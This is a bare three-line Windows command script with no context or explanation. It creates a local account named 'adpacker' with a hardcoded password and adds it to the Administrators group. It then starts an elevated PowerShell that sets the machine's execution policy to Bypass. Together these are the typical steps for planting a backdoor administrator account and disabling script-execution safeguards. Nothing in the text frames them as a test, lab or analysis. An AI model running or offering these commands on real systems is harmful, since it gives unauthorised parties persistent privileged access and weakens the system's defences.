net user /add adpacker xBph2L?h
net localgroup administrators adpacker /add
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList 'Set-ExecutionPolicy Bypass -Force' -Verb RunAs}"

